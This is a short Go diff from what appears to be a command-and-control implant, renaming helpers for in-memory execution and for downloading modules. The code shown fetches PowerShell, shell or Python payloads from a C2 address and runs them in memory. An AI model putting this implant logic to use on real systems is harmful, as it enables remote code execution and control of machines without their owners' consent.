@@ -64,7 +64,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	// switch on payload type, in memory execution
 	switch payload_type {
 	case "powershell":
-		out, err := agentutils.RunPSScript(payload_data, env)
+		out, err := agentutils.ExecutePowerShell(payload_data, env)
 		if err != nil {
 			return logging.Sprintf("running powershell script: %s (%v)", out, err)
 		}
@@ -72,7 +72,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	case "bash":
 		executable = def.DefaultShell
 		logging.Printf("shell executable: %s", executable)
-		out, err := agentutils.RunShellScript(payload_data, env)
+		out, err := agentutils.ExecuteShell(payload_data, env)
 		if err != nil {
 			return logging.Sprintf("running shell script: %s (%v)", out, err)
 		}
@@ -81,7 +81,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 		executable = "python"
 		args = []string{exec_cmd}
 		if inMem {
-			out, err := agentutils.RunPythonScript(payload_data, env)
+			out, err := agentutils.ExecutePython(payload_data, env)
 			if err != nil {
 				return logging.Sprintf("running python script: %s (%v)", out, err)
 			}
@@ -170,7 +170,7 @@ func prepareModuleOnDisk(tarball, modDir string, payload_data []byte) error {
 
 func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
 	if crypto.SHA256SumFile(file_to_download) != checksum {
-		if data, err = c2transport.SmartDownload(download_addr, file_to_download, "", checksum); err != nil {
+		if data, err = c2transport.FetchFile(download_addr, file_to_download, "", checksum); err != nil {
 			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
 		}
 	}
